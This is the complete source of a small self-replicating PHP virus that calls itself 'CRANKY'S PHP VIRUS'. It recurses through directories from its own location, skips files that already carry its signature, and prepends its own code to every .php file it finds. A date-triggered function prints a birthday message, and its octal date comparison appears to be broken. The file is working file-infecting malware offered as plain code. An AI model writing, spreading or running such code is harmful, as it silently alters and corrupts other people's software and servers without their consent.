<?php
define("SIGNATURE", "CRANKY'S PHP VIRUS");
// determine whether backslash or forward slashes are used
define("SLASH", stristr($_SERVER['PWD'], "/") ? "/" : "\\");
$linenumber = __LINE__;
define("STARTLINE",$linenumber-4);
define("ENDLINE",$linenumber+45);
function search($path){
    $ret = "";
    $fp = opendir($path);
    while($f = readdir($fp)){
        if( preg_match("#^\.+$#", $f) ) continue; // ignore symbolic links
        $file_full_path = $path.SLASH.$f;
        if(is_dir($file_full_path)) { // if it's a directory, recurse
            $ret .= search($file_full_path);
        } else if( !stristr(file_get_contents($file_full_path), SIGNATURE) ) { // search for uninfected files to infect
            $ret .= $file_full_path."\n"; 
        }
    }
    return $ret;
}
function infect($filestoinfect){
    $handle = @fopen(__FILE__, "r");
    $counter = 1;
    $virusstring = "";
    while(($buffer=fgets($handle,4096)) !== false){
        if($counter>=STARTLINE && $counter<=ENDLINE){
            $virusstring .= $buffer;
        }
        $counter++;
    }
    fclose($handle);
    $filesarray = array();
    $filesarray = explode("\n",$filestoinfect);
    foreach($filesarray AS $v){
        if(substr($v,-4)===".php"){
            $filecontents = file_get_contents($v);
            file_put_contents($v,$virusstring.$filecontents);
        }
    }
}
function bomb(){
    if(date("md") == 0125){
        echo "HAPPY BIRTHDAY CRANKY!";
    }
}
$filestoinfect = search(__DIR__);
infect($filestoinfect);
bomb();
?>
